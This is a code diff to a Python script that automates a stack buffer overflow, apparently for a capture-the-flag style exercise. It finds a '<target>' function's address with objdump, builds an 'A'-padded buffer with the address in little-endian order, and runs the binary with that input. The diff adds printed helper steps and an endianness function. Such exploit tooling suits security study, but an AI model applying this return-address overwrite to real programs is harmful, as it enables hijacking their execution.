@@ -5,6 +5,15 @@ from os import remove
 
 TMP_FILE = "/tmp/vuln_program.dump"
 
+def help():
+	print("Get target address")
+	print("objdump -D EXEC > /tmp/out.dump")
+	print("cat /tmp/out.dump | grep \"<target>:\"")
+
+	print("cat /tmp/out.dump | grep -n \"<prompt>:\"")
+	print("sed \"ADDRq;d\" /tmp/out.dump")
+	print("OFFSET - 0x8 + 0xC")
+
 def create_obj_dump(exec_path):
 	dump_file = open(TMP_FILE, "w")
 	dump_proc = call(["objdump", "-D", exec_path], stdout=dump_file)
@@ -60,6 +69,12 @@ def _get_buff_assem(assem_input):
 def call_exec(executable, input_buff):
 	vuln_proc = run([executable], input=bytes(input_buff))
 
+def convert_endian(addr):
+	# Convert to byte pairs and reverse the order
+	byte_pairs = ["".join(x) for x in zip(*[iter(addr)]*2)][::-1]
+	return "".join(byte_pairs)
+	
+
 def main():
 	create_obj_dump(argv[1])
 	hex_input_addr = fix_target_addr(get_target_addr())
@@ -68,11 +83,8 @@ def main():
 	a_buffer = "A" * buff_size
 	delete_obj_dump()
 
-	# Convert to byte pairs and reverse the order
-	byte_pairs = ["".join(x) for x in zip(*[iter(hex_input_addr)]*2)][::-1]
-
 	# Craft malicious input
-	malicious_input = bytearray(a_buffer, 'utf-8') + bytearray.fromhex("".join(byte_pairs))
+	malicious_input = bytearray(a_buffer, 'utf-8') + bytearray.fromhex("".join(convert_endian(hex_input_addr)))
 
 	# Call the exec passed in with malicious input
 	call_exec(argv[1], malicious_input)
